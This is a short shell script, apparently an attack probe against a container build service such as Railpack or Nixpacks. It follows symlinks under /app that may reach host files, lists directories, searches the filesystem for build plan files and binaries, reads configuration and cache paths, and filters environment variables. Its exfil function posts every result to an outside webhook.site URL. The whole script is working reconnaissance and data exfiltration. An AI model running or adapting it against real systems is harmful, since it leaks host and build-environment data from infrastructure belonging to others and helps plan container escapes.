#!/bin/sh
# Lane C battery5: symlink deref test + plan file discovery
TOKEN="31fc19a8-5cfc-44ac-b27f-517fdcb8ffbb"
W="https://webhook.site/$TOKEN"
exfil() { printf '%s' "###$1### $2" | curl -sS -m 25 -X POST "$W" -H "Content-Type: text/plain" --data-binary @- >/dev/null 2>&1; echo "exfil:$1 done"; }

G1="host=$(hostname) date=$(date -u)
=== symlink lstat ===
$(ls -la /app/hostlink* 2>&1)
=== readlink ===
$(for f in /app/hostlink1 /app/hostlink2 /app/hostlink3 /app/hostlink4 /app/hostlink5; do echo \"$f -> $(readlink $f 2>&1)\"; done)
=== deref ls hostlink1 ===
$(ls -la /app/hostlink1/ 2>&1 | head -20)
=== deref ls hostlink2 ===
$(ls -la /app/hostlink2/ 2>&1 | head -20)
=== deref cat hostlink3 ===
$(cat /app/hostlink3 2>&1 | head -5)
=== deref cat hostlink4 ===
$(cat /app/hostlink4 2>&1 | head -5)
=== deref ls hostlink5 ===
$(ls -la /app/hostlink5/ 2>&1 | head -10)"
exfil "G1-symlink" "$G1"

G2="=== /app listing ===
$(ls -la /app 2>&1 | head -40)
=== find plan files ===
$(find / -maxdepth 5 \( -name 'railpack-plan.json' -o -name 'nixpacks-plan.json' -o -name '*.plan.json' \) 2>/dev/null | head -20)
=== find railpack binary ===
$(find / -maxdepth 5 -name 'railpack*' -type f 2>/dev/null | head -20)
$(which railpack buildctl 2>&1)
=== /etc/mise/config.toml ===
$(cat /etc/mise/config.toml 2>&1 | head -30)
=== /root/.cache ===
$(ls -la /root/.cache/ 2>&1 | head -20)
=== env buildkit-ish ===
$(env | grep -iE 'BUILDKIT|BUILDX|RAILPACK|NIXPACKS' 2>&1)"
exfil "G2-planfile" "$G2"
echo "battery5 done"
